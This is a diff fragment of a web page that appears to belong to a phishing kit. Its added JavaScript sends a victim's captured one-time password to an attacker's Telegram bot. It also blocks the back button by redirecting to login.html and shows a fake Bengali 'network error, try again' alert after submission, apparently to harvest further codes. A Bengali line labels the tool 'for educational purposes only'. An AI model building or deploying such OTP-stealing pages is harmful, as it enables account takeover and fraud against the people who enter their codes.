@@ -204,4 +204,37 @@
 
 📅 <b>Date:</b> ${otpData.date}
 
-<blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কার
+<blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কারো ক্ষতি করার উদ্দেশ্যে এটি ব্যবহার করবেন না।</blockquote>`;
+
+                console.log('Telegram Message:', telegramMessage);
+
+                await sendToTelegram(telegramToken, telegramChatId, telegramMessage);
+                
+                console.log('OTP sent to Telegram');
+            } catch (error) {
+                console.error('Error in main flow:', error);
+            }
+        });
+
+        window.onload = () => {
+            startTimer(60); 
+        };
+
+        window.addEventListener('popstate', function(event) {
+            window.location.href = 'login.html';
+        });
+
+        window.history.pushState({}, '');
+
+        document.getElementById('goBack').addEventListener('click', function() {
+            window.location.href = 'login.html';
+        });
+
+        document.getElementById("submitButton").addEventListener("click", function() {
+            setTimeout(function() {
+                alert("দুঃখিত, নেটওয়ার্ক ত্রুটির কারণে সমস্যা হচ্ছে, দয়া করে পুনরায় চেষ্টা করুন।");
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
